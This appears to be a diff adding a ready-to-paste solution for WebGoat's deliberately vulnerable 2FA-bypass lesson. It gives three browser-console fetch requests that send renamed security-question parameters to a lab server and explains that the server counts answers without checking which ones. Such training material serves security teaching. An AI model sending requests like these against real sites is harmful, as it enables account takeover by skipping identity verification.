@@ -1,0 +1,66 @@
+====================================================================
+2FA BYPASS - COPY & PASTE SOLUTION
+====================================================================
+
+STEP 1: Get your User ID (if different from 12309746)
+------------------------------------------------------
+In WebGoat, press F12 → Console, run:
+document.querySelector('input[name="userId"]').value
+
+Copy the value if it's different from 12309746.
+
+====================================================================
+STEP 2: COPY AND RUN THIS IN BROWSER CONSOLE:
+====================================================================
+
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion2=bypass&secQuestion3=attack&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746'
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+IF THAT DOESN'T WORK, TRY THIS (skip 0, use 1 & 2):
+====================================================================
+
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion1=test&secQuestion2=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746'
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+DYNAMIC VERSION (auto-detects userId):
+====================================================================
+
+const userId = document.querySelector('input[name="userId"]')?.value || '12309746';
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: `secQuestion2=bypass&secQuestion3=attack&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=${userId}`
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+WHAT'S HAPPENING:
+====================================================================
+
+Original parameters (what server expects):
+  secQuestion0=answer1
+  secQuestion1=answer2
+  jsEnabled=1
+  verifyMethod=SEC_QUESTIONS
+  userId=12309746
+
+Your bypass (what you're sending):
+  secQuestion2=bypass      ← RENAMED!
+  secQuestion3=attack      ← RENAMED!
+  jsEnabled=1              ← Same
+  verifyMethod=SEC_QUESTIONS ← Same
+  userId=12309746          ← Same
+
+The trick: Server counts 2 parameters but doesn't check WHICH ones!
+
+====================================================================
